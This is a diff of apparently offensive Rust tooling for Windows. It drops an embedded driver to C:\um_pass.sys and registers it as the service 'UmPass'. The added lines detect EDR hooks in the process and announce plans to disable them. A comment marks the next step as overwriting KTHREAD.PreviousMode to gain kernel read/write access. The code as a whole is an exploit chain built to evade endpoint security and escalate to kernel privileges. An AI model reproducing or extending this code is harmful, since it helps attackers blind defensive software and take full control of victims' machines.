@@ -105,7 +105,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         Ok(_handle) => { }
         Err(err) => {
             eprintln!("[-] Could not get handle, error: {}. Need to download...", err);
-            let svc_name = "umpass";
+            let svc_name = "UmPass";
             let bin_path = r"\\??\\C:\\um_pass.sys"; // escaped backslashes
             svc::write_embedded_file("C:\\um_pass.sys")?;
             // Try modifying the registry first
@@ -126,6 +126,12 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
     println!("[+] Got driver handle: {:?}", h_drv);
+
+    // =-=-> Check for EDR DLL we may need to unhook things
+    let mut hooked = utils::is_edr_dll_loaded_in_self();
+    if hooked {
+        println!("[*] Current process is hooked. Let's disable to enable Modus Previosa.")
+    }
 
     // =-=-> Overwrite KTHREAD.PreviousMode for kernel RW
     let thread_addr: Option<*mut c_void> = km::get_thread_info();
